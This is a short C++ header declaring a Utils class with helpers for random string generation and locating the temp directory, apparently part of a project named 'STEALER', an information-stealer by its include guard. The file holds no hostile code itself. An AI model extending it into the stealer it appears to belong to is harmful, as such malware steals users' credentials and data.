//
// Created by .1qxz on 06.06.2024.
//

#ifndef STEALER_UTILS_H
#define STEALER_UTILS_H
#include "Includes.h"
#include <random>
#include <algorithm>

class Utils {
public:
    static std::string generateString(size_t length);
    static std::filesystem::path getTemp();
};


#endif //STEALER_UTILS_H